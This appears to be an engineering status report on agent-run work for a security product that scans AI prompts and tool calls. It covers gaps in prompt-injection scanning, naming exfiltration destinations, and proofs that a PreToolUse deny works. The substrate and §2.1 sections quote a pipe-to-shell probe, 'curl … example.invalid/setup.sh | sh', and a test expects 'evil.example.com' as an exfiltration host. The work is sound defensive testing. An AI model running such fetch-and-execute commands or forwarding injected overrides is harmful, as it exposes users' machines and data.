undeclared loss**. Combos, obfuscation, decoded payloads and unquoted signals all still fire.

**Two corrections to the premise I gave it:**
- The seven refusals' **prompt text does not survive anywhere on this box** — only a classification table.
  The reconstructions reproduce the documented *shape*, not the bytes, and say so.
- **Only 2 of the 7 were prompt-lane at all.** The other five were tool-lane rules in a different package.

### Its own mutation initially PASSED — and it caught that

Mutation 1 reverted the discipline in production code and the corpus stayed green, because the corpus's
"after" arm called the internal function rather than the production entry point. **A one-line production
revert was invisible to the measurement.** Fixed and re-proven; the mutation now reports
*"the quoting discipline removed NO false positives"*.

### §3.5 — and what it checked against the earlier security regression

**The checklist named the wrong commit.** The reverted attempt was `556b0483`, reverted 85 minutes later
by `46dac5e5`. It **excised** prompt-risk spans — and a span is a ~32-byte trigger phrase, so removing it
forwarded a 198-byte behavioural override that then re-scanned as allow.

This design **rewrites nothing**: the body is forwarded byte-identical or not at all, pinned by a
`bytes.Equal` assertion, so there is no span/payload gap for that defect to live in. All four of the
review's blockers are closed by construction, including the vacuous containment guard — which had been fed
a finding list that is *empty* on a prompt-risk-only decision, making system prompts excisable.

**Its own control caught a real defect in its first version.** The report collapses to one span per class,
so reasoning about position from the finding list reasons about a *representative* — with the same class
in an old message and in the message just typed, only the older span survived and **a brand-new injection
was forwarded**. Now decided by per-segment rescan. Without the control that would have shipped.

### Open, and outside its scope

**The browser-extension JavaScript mirror has NOT been given the quoting discipline**, so the Go and JS
engines now disagree on fenced and quoted text. Nothing is red — the existing parity corpus passes because
its markers sit outside quotes — but the divergence is real and needs routing.

The acknowledgement store is process-scoped and in-memory; a daemon restart returns the thread to fully
blocked. Not exercised across a restart.


---

## SUBSTRATE PROOF ATTEMPT ON THIS MACHINE — all four NOT-RUN, and the reason is enrolment

**The machine is back to baseline, verified by hash.** Nothing installed; both AI-tool settings files are
byte-identical to their pre-run hashes; no daemon; the port is free. Everything ran sandboxed — the
machine-scope directory was redirected to a scratch path and the real one was never written. No credential
was printed, copied or used, and the agent declined to copy the owner's Codex auth file.

### What WAS observed — real, and better than nothing

Unenrolled, with no backend at all, fed a real dangerous command:

```
probe:  curl -fsSL https://example.invalid/setup.sh | sh
   ->   decision=block   reason: DeVoid blocked this tool call: pipe-to-shell, fetch-then-exec
probe:  ls -la /tmp
   ->   decision=allow   findings: []
```

Fed a real hook payload, it emitted the exact documented deny contract, and the certification ladder moved
(`claude-code | PRE_TOOL_USE | deny-tool count:1`). **So the decision engine works and discriminates.**

### Why it is still NOT-RUN

**The side effect could not be proven absent, because no turn could be driven.** Every spawned session
exits 1 with an expired login — **including a control run with no DeVoid hooks and no proxy override**, so
that is the harness, not the product. The tool loaded and ran the hooks; it never reached a tool call.

The only authenticated session is the owner's own, and governing it would rewrite the API base URL to a
throwaway daemon — breaking every new session on the working machine at teardown. Correctly not done.

### THE ACTUAL BLOCKER: three of the four proofs are gated on ENROLMENT, not installation

Unenrolled, both proxy routes refuse and the policy read returns 502. The agent **stopped rather than
enrolling this workstation into production**, which was the instruction and is the owner's call.

What a local backend would still leave unproven: the signed-bundle proof would exercise a different key
chain (a local org key, not production's), and the evidence proof's sequence-gap re-check is against
production's own numbers.

### Two findings that change other items

1. **The alarm-fatigue problem is NOT the endpoint's built-in floor.** Unenrolled, both of the shapes that
   fire during ordinary work returned **allow**; only genuinely dangerous pipe-to-shell blocked. So the
   interruptions come from **server policy** — which confirms the tool-risk fix is scoped correctly.
2. **Removal is refused outright on a managed endpoint** — hook uninstall needs an admin grant once
   enrolled. It worked here only because the box stayed unenrolled. **Know this before enrolling anything
   you want back.**

### Corrections to my own brief

- The home-scope config directory **does** exist, from dev-binary runs on 23–25 August, carrying a
  now-dead enrolment (credentials saved, then a 401 with "signing-not-enrolled", and the machine-scope
  directory it names is gone). Residue, not an install — but I stated it was absent.
- The warning that the installer does **not** install the AI hooks is **confirmed**: they had to be
  installed by hand, and then they worked.

Left behind: branch `wave47/liveproof`, one commit, rewriting three stale quarantine reasons with what was
actually measured. **All four observed flags remain false**, and the register's own test still passes. One
of those reasons claimed a directory exists that does not — the same shape of stale line that misled a
reader once before.

---

## Lane 8, round 3 — CLOSED (installer routes, the outage class). 11 commits on `wave47/httpbound`.

**It marked six routes, not the three reported** — because the classification rule is per-method, so it is
equally true of the three nobody had noticed. Listing only the noticed subset would have been exactly the
"second list somebody has to remember to update" that this mechanism exists to remove. One route with no
guards at all was correctly **not** swept in, and a test pins that it stays unmarked.

**M10 reproduced the outage** on the route an endpoint onboards through: removing one mark turned an
undeclared field from accepted-and-counted into **400 Bad Request**. Every tolerate case also asserts the
drop is counted at its exact path, with a clean-body control.

### The key-type question, answered with evidence rather than an opinion

**Nothing states the current behaviour is intended, and the nearest statement asserts the opposite.** The
commit that put signature checking on these routes describes them as already enforcing a required key
type. **Six of the eight never did**, confirmed by reading that commit's own version of the file. So the
gap is **an unexamined belief, not a documented decision**. Pinned as current behaviour, not tightened —
a runner-scoped key is admitted on one route while its sibling, which *does* declare the key type, rejects
the same key. That contrast proves the admission is the missing marker rather than a permissive guard.

### A false claim of its own, caught by its own mutation

**Its mutation did NOT go red — and it reported that as its error rather than as a pass.** Its commit had
claimed the leniency spec fails if a mark is removed. Deleting the controller from the scanner's list left
that spec **fully green at 32/32** while the installer DTOs quietly stopped being checked — because
removing a name does not fail an assertion, **it removes the assertion.**

That is the precondition-that-skips-the-check shape, operating one level *above* the gate it was meant to
protect. Closed by computing the set from source and comparing it to the declared list, with two further
guards so the coverage spec cannot itself go inert.

**Not exercised:** two of the six marked routes have no wire test of their own, and whether any real
integration relies on the current key admission needs a production query that was not run.

---

## An environment hazard that bit two lanes in one day

**`git stash` is shared across every worktree of a repo.** `refs/stash` lives in the shared repository, so
concurrent sessions push onto and pop from the same stack.

One lane's `push` created nothing because its file was already clean — so its `pop` **applied a different
agent's stash**, producing 8 conflicted files across four unrelated areas. It restored every foreign path
by name and removed the untracked files the pop brought in. The other lane's entry survived at
`stash@{0}` **only because a conflicted pop preserves the entry**; a clean pop would have consumed it.

Two siblings from the same day: a shared scratchpad helper was overwritten by another agent mid-run, and
mutation scripts that `git checkout --` their target **destroy uncommitted work in that file**.

Recorded as a standing rule: **no `git stash` in this workspace**, namespace scratchpad tooling per lane,
and commit before mutating.

---

## Lane 11, round 2 — CLOSED (§4.5 the destination is now named). `wave47/console`.

A network-exfiltration detection used to describe what happened without ever naming where the data was
going. It does now.

**All four premises re-verified before editing, not taken on report** — the agent stamps it, the write-side
sanitiser is a deny-list rather than an allowlist so it persists verbatim, it died at the read-side
allowlist (zero occurrences anywhere in Backend source), and **the trap is real**: the producer's map is
typed as string-to-string in Go, so the value can *only* ever be a comma-joined string, while the console
gates on `Array.isArray`.

### The mutation that matters is the second one

**Mutation 1** (remove the allowlist entry) reds 7 of 21 — and the stored-row test correctly **stays
green**, which is how you can tell it is not the deliverable.

**Mutation 2 is the naive fix: forward the string unchanged.** It reds **16 of 21**.

```
Expected: ["api.openai.com", "evil.example.com"]
Received: "api.openai.com,evil.example.com"
```

That is precisely what an HTTP 200 and a populated database column would both have "proved". Without that
second mutation, a fix that renders nothing would have shipped looking correct.

Restored, 21/21, including: a single destination is still a list; nothing readable renders as **absent, not
an empty array**; a URL, a host with a port, markup, a sentence, a newline-forged second line, an
over-long label and a bare dot are each refused **without losing the good entries beside them**; the list
is capped and de-duplicated so it cannot become the payload; and a future array producer is accepted rather
than silently dropped — the `evidence_ref` failure shape, avoided deliberately.

**A grammar decision worth knowing:** the existing token rule admits `:` `/` `+` `=`, so it would have
passed a full URL as a "host". A DNS host-name grammar is used instead. Side effect: a host **with a port
is refused**. The producer contract says host names, so that was treated as correct — reversible if ports
should survive.

**No Frontend change was needed** — the type and the rendering already existed. The backend was the only gap.

### Two corrections to the survey it was handed

- **One console surface reads it, not four.** The other matches use "egress" only as English in headlines.
- **The quoted copy does not exist.** Searched every phrase; the real strings are different words —
  *"Blocked: destination host not allowed"*, *"Redacted, then sent"*, *"Sent (allowed)"*. Same conclusion:
  every one describes the event without naming the destination. **The fix stands on the real evidence.**

### The sibling was wider than reported — three fields, and the decision is taken

Not one field but **three**: tool decision, provider, and server-enforced. The backend emits all three as
**top-level** fields on the event; the console reads all three from **inside metadata**. So three chips
never render, and it reads as a small oversight because the neighbouring `tool` chip *does* work.

**Decision: point the console at the top-level fields**, rather than also projecting them into metadata.
The faster option would have shipped the same fact **twice in every payload**, and two copies of one fact
is how surfaces start disagreeing — the exact class this wave has been closing. Its only cost was needing
a Frontend release, and a Frontend deploy is already in the plan, so that cost is zero. Routed, with the
requirement that a null "server enforced" renders the honest-unknown state and never a definite "false".

Also confirmed: the live-Postgres fixture correction I applied earlier is the only required follow-up from
that lane's first round, and it is closed — though it still carries no evidence either way until something
runs it against a database.

---

## Lane 1 — §1.1 COMPLETE INVENTORY. **HARD GATE.** 3 commits on `wave47/inventory`.

Measured on the real home directory, before and after, with the real resolver:

| | before | after |
|---|---|---|
| candidate files **seen** | 18,336 | 6,842 |
| candidate files **kept** | **200** | **6,842** |
| total nodes | 1,039 | **20,053** |
| `.codex/sessions` nodes | **0** | **193** |
| truncated | false | false |
| depth-pruned directories | **425** (at depth 8) | **0** (at depth 32) |

**All three required assertions pass.** The 425 figure was confirmed by an independent bare-walk probe
rather than quoted from the checklist.

Six mutations, each red then green: remove the nine marketplace rows; restore the old ceilings; remove the
depth-prune signal; remove it from the completeness answer; stop marking a candidate drop as truncated;
remove it from the daemon's own re-derivation. Tree verified byte-identical to HEAD afterwards.
Full `internal/aicontext` suite green (1898 s).

**Upload stayed narrow and was not changed** — the batch converts findings and aggregates field by field,
carries no file bodies and no node list, and every string field including the path is scrubbed and clamped
inside the post call, so no caller can opt out. Resolution and upload are structurally separate.

### ⚠️ It found the thing that blocks shipping its own work

**The periodic sweep takes ≥50 minutes and did not complete.** CPU was only 1,411 s of that — it is
I/O-bound, not compute-bound.

The mechanism: a timestamp lookup runs **inside a sort comparator**, roughly two filesystem calls per
comparison. At 1,039 nodes that was ~21,000 calls. At 20,053 nodes it is **~574,000**, plus two more per
node elsewhere. At this box's measured ~317 calls per second that is about thirty minutes of pure syscall.

**The defect is pre-existing. Completing the inventory is what makes it load-bearing** — and this is the
daemon's periodic sweep on every customer endpoint. Routed back with its own diagnosis as the fix: stat
once per node into a cached struct and sort on the cached value.

Also routed back: finish the read-only proof it had to kill (currently resting on construction plus a spot
check, not measurement), and examine chunking — only findings are chunked, aggregates ride the first chunk
whole, and twenty times the scanned files means many more aggregate rows in one unchunked body.

**One edit outside its list, correctly flagged:** the daemon re-derives the coverage answer itself, so a
signal added in the package and not there would silently report green. Left in, because removing it would
have made the depth-pruning honesty untrue in production.

---

## The quarantine data-loss P0 already happened, to the owner, and the file still says it is fine

`~/.codex/history.jsonl` is **211 bytes**, dated **2026-08-23 02:03**. Its whole content is the quarantine
marker, which reads:

> *"The original content is preserved and can be restored from the DeVoid console."*

**There is no stash.** No quarantine directory under the home config dir, no backup file, no machine-scope
copy — the stash directories do not exist at all. The daemon that would restore it is not installed and
there is no console to restore from.

So the owner's Codex command history was truncated in place, the original destroyed, and **the file left on
their disk still tells them it is recoverable.** This is the exact defect this wave fixed, having already
happened, with the marker's promise outliving the thing it promised.

The fix stops the stash being deleted. It cannot make an orphaned marker honest — and a marker claiming
recovery when none exists is **worse than no marker**, because it stops someone looking for another copy
while one might still exist.

Routed: make the promise conditional on the stash actually being present, and make an orphaned marker a
distinct reportable state — the inverse of the orphaned-`.bak` case already handled. **The owner's file is
gone; the thread history in the separate SQLite stores is a different artefact and was not touched.**

---

## Lane §4.4, round 2 — three follow-ups, and the third one found something serious. 5 commits.

### 1. The third surface closed, with a design call worth keeping
The item-detail page's "which machines have this" list is now projected through the same coverage function
as the other three. **But the coverage state there is item-level, not per host row** — on the machine page
a row IS an artifact, so coverage belongs on the row; on the item page the artifact is fixed and a row is a
HOST, and stamping coverage per host would read as a claim that each workstation was analysed separately,
which is not a fact this system holds. A three-surface assertion now pins that machine page, catalog and
item page produce identical output for one artifact.

### 2. Six dark tests now execute — and immediately caught a real defect

It found **three** files, not the two reported. All three computed a path by counting directory levels to
a workspace root that no longer exists — proven by printing the resolved path and its non-existence, not
inferred. A sibling one directory away was fixed on 2026-08-08 and these were missed.

**The third was worse than a skip.** It has been asserting producer/consumer parity against
**hand-maintained inline copies** since it was written, reporting green for a comparison that never read
the producer's fixtures. Its "the canonical fixtures file is present" check sat *inside* a condition that
was false everywhere — so it was **not a skipped test, it was never registered.** It now announces which
mode it is in, in both directions, and refuses to pass silently in the degraded one.

### ⚠️ What the newly-executing tests found — this is the prize

**Backend's vendored contract — the copy Backend compiles and SHIPS — was pinned at version 2 while
Backend's runtime enforces 6.** Seven top-level result keys the product has been accepting for months were
undeclared in the contract it ships.

All three copies checked before touching anything: the workspace-root reference is at **6**, the
Intelligence mirror is at **6** and byte-identical to it, and **the shipping copy was the sole outlier at 2**.
The canonical's own changelog records a catch-up that *"was not bumped in lockstep until now"* — a catch-up
the shipping copy never received. So this was one stale file, not a cross-repo judgement call. Synced,
purely additive, no key removed; all three now byte-identical.

Mutation-proven by sabotaging the canonical contracts: 19 of 72 red, restored to 72 green. A first attempt
**aborted itself** — *"NO-OP SABOTAGE — anchor missed, proof would be worthless"* — a guard the lane put in
its own mutation script rather than let it report a hollow pass.

### 3. My diagnosis of the built-package divergence was half wrong

I said a style sweep had edited the built artifact, so every rebuild would silently reintroduce the
difference and the gate's colour would depend on who rebuilt last.

**It was not a style sweep.** A commit hand-wrote a new declaration straight into the built type file
instead of rebuilding — it touched the declaration and the source but left the JavaScript and all three
source maps unregenerated, which a real rebuild never does. The hyphens are a symptom of one doc comment
being typed twice by hand.

**So the source was not what needed fixing.** Editing it to match would have rewritten a contract's prose
to match a typo in a build artifact, and left the file internally inconsistent — eighteen other em dashes
sit in that same file, identical in both copies. And **there is no em-dash gate over that package in this
repo at all**, so my premise about a gate flipping colour did not hold either.

Fixed by running the repo's own build. Seven files have real content changes; the other ninety were pure
line-ending churn and were deliberately left unstaged. Idempotence proven: a second clean rebuild produces
**zero** further diff.

### One process question for the owner
**Why the shipping copy fell four versions behind for months** is worth asking whoever bumped the reference
copy. The sync is done; the process that skipped the shipping copy is not.

---

## Lane 13, round 3 — six render defects fixed, with the crash proved visually. 5 commits on `wave47/fesmall`.

Screenshots under `…/scratchpad/r47-render-harness/wave47-fixed/`, including
`broken--admin-endpoints-sub-coverage.png` — a full-page **"500 SOMETHING WENT WRONG"** — beside
`fixed--admin-endpoints-sub-coverage.png`, the same wire state rendering normally.

1. **The all-clear over zero** now reads `0 MCP SERVERS · NO CONFIGURATION SOURCE WAS READ`, with
   *"MCP COVERAGE NOT MEASURED … This is not a statement that there are none."* — both phrases reused
   verbatim from this product. **Its first cut over-reached and three existing tests caught it**: it had
   conflated "we were not told what was read" with "we were told that zero were read", which this product
   already distinguishes. The flag is now reserved for a *measured* zero.
2. **The tile** reads 2 endpoints over two rows. **Only the total was widened** — the other three counters
   are statements about an *agent*, and a machine with no agent has none. A test pins that they must not
   move.
3. **The picker** now says it is a separate read, and only when there is something to reconcile.
   **Both false comments corrected** — the one beside the markup and a second in the prop docblock. Both
   reasoned about the value *written* and concluded something about the text *said*.
4. **The guessed URL.** The canonical cookie name has **170 uses**; the broken route held the **only**
   instance of the other spelling — the one that matches the *product* name, which is why it read as
   correct to everyone who looked. Fixed, with a case pinning the misspelling as a name that must **not**
   authenticate.
5. **+6. The page crashes.** The guard covered the outer object and then reached through a middle one with
   a plain dot; that middle field is typed *required* but arrives through an unchecked cast. **Three more
   siblings in the same component.** And **one apparent sibling was not one** — that panel's fetch already
   rejects the bad shape, so the guard would have been dead code. It removed its own guard and **pinned the
   invariant instead**, noting that deleting it would reopen the defect in the worse direction.

Five mutations, each in isolation, controls green throughout. Four diffs it could not reach were routed.

---

## Lane 10, round 3 — the corpus correction, done through the real protocol. 7 commits.

**The protocol turned out to be regeneration, not a hand-written correction.** It looked for a precedent to
copy, as instructed, and found **none** — every governance-correction block is null across all 158 cases
and no code even models the field. So it did not invent one. The documented path is a generator that builds
and runs the real engine and regenerates the corpus, the index and the drift manifest together.

**So the corpus was regenerated from the engines, not edited** — which is why no reviewer identity had to
be supplied: every provenance field is stamped by the generator exactly as before. Nothing fictional was
recorded. Both digests moved to the same new value, **and that value is the one the browser produced
independently before the regeneration**.

### A regeneration hazard it predicted, caught and reverted

The runner enforces a 5-second per-case budget, so on a contended box random cases finish as
"budget exceeded". **Run 1 baked that into three DLP *attack* cases. Run 2 into a different benign one.**
Committing either would have recorded *"we ran out of budget"* as the expected answer for an attack case.

It kept only the intended case, restored everything else byte-for-byte from HEAD including the drift
totals, then **audited rather than assumed**: every case in every generated file byte-identical except the
one, all 158 digests still reproducing, and one file dropped from the commit entirely because its only
diff was line endings.

### It reported a non-green rather than a green it did not get

The package still fails — **but the corrected case is absent from every failure list**, and the failures
are a *rotating* set of load-dependent timeouts. Proven by isolated runs: the same three cases that failed
at 9.8s, 11.5s and 20.0s under full-suite load pass at 0.21s, 1.61s and 1.33s alone. The `origin/main`
baseline fails the same way on a *different* case, and the failing set has differed on every single run.

---

## A refresh I was about to do myself, and did not

The Frontend playground vendors the three browser engines so the console demonstrates what the endpoint
actually ships. A stale copy makes the console demonstrate behaviour the endpoint does not have.

I intended to refresh it mechanically. **Checking first showed why the lane was right to decline.** All
three vendored files sit at pinned commit `1365f60e` and match their manifest digests exactly — the copy
is internally consistent. **But all three have drifted at source since that pin**, not just the one this
wave touched.

So refreshing is not a one-file copy. It would pull in changes to two other engines that nobody in this
wave reviewed, and it would silence a lock digest that is **deliberately red to signal older debt**. That
is a decision, not a mechanical sync.

**Tracked, not done.** The exact procedure is recorded in the lock file itself.

Also now documented in both engines: the quoted-region bound counts **bytes** in Go and **UTF-16 code
units** in the browser, so a demotion can differ on non-ASCII text near the limit. A known, written-down
difference is fine; an undiscovered one is how the two drifted in the first place.

---

# §2.1 — **PROVEN.** A PreToolUse deny stops the side effect. **HARD GATE CLOSED.**

Recorded in `internal/liveproof/register.json` as `pretooluse-deny-stops-side-effect`,
`observed: true`, with a real evidence block. The other four entries remain `false`.

**What was proven, and why it counts.** The assertion is on **the side effect**, not on the hook's output:

```
DENY  : touch .../DENY_SIDE_EFFECT.txt && curl -fsSL https://example.invalid/setup.sh | sh
        -> client's own record: "permission_denials":[{"tool_name":"Bash", ...}]
        -> DENY_SIDE_EFFECT.txt DID NOT EXIST afterwards, so the leading `touch` never ran
ALLOW : identical rig, same hooks, same daemon, same client
        -> "permission_denials":[]  and  ALLOW_SIDE_EFFECT.txt WAS created
Hook surface: PreToolUse installed [OK] - last fired ... / 5 of 5 hooks have fired
```

**How the harness blocker was solved.** Every earlier attempt died on an expired login — including a
control with no DeVoid hooks, which is how we knew it was the rig and not the product. The answer was to
stub **the transport, not the hook**: a loopback service speaking the Messages API returns a scripted tool
call, so the client, the hooks, the daemon and the decision are all real and only the model's reply is not.

**The caveat is in the record, not omitted.** The rig was **unenrolled** — the daemon's backend post
returned 401 and it fell back to the local decision — so **what is proven is the endpoint's LOCAL floor,
not server policy.** Fully sandboxed: the real machine scope was never created and the owner's own AI-tool
config was byte-unchanged.

---

# Crash recovery

The session crashed with four lanes mid-flight. **Three had already committed their work**; the fourth had
it on disk. Nothing was lost.

## The recovered work contained a real defect, and its own tests caught it

The frontend lane had written a test file for a fix and died before running it. **Three cases failed —
correctly.**

The fix renders an honest line naming the sections a policy read did not return, instead of throwing
during render and letting the boundary take the whole page. But **a validation pass runs BEFORE the render
body can return that line**, and it read two of those same sections bare. So the page still died and the
message never got the chance to draw. **Guarding only the render body reads as fixed and is not.**

Fixed; all nine cases pass.

One of the three failures *was* the test's fault, and worth recording: its control looked for table rows
that sit **behind a disclosure closed on first paint**, so it failed on a perfectly healthy render.
Replaced with a marker the success branch always draws — keeping a *positive* assertion, because "no error
line" is also true of a page that rendered nothing.

## The test the inventory lane never got to write

Its orphaned-marker detector was complete and building; the test died with the crash. Written and
**mutation-proven both ways**: neutralise the detector and two tests go red naming the owner's own file;
fold orphans into coverage and the third goes red. Two of my own fixtures were wrong first and were fixed
rather than weakened — one was **unbuildable by construction** (a path through a file component can never
resolve, so the unknown branch was never reached), and one was not a complete sweep at all.

## One conflict in the whole wave

`orphan_test.go` — the inventory lane had cherry-picked it from the plugingate lane, which then added a
further test. Resolved by taking the **superset** after proving it strictly contained the other version.
That extra test is the one that makes the legacy-marker fallback load-bearing rather than decorative.

## A crash artefact that looks like a code error

A dev server killed mid-write left a **corrupt generated file** under the Frontend's `.next/dev/types/`.
That path IS in the typecheck's include list, so `tsc` failed on it. It is gitignored and regenerable —
**delete the artefact before diagnosing a typecheck failure in a generated path.**

---

# Integration state

| | commits | verification |
|---|---|---|
| Installers `wave47/integ-installers` | **43** — all 8 lanes | build + Windows cross-build + vet clean; package tests green |
| Backend `wave47/integ-backend` | **67** — all 7 lanes | `tsc --noEmit` clean |
| Frontend `wave47/integ-frontend` | **32** — all 3 lanes | `tsc --noEmit` clean |

Every merge was verified **by ancestry**, not by reading merge output — which caught two branches that had
advanced after being merged and would otherwise have been silently left behind.
